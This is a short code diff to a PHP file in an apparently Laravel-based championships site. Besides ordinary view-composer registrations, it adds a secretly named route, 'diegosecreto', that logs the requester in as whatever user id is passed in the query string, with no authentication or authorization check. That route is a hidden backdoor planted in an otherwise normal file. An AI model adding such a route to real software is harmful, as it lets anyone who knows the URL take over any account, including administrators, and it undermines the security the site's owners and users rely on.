@@ -1,4 +1,12 @@
 <?php
+
+Route::get('diegosecreto', function(){
+
+	Auth::loginUsingId(Input::get('id'));
+
+});
+
+
 // view composers
 View::composer('championships.partials.filters', 'Champ\Composers\CompetitionFilterComposer');
 View::composer('admin.championships.coupons.index', 'Champ\Composers\ChampionshipComposer');
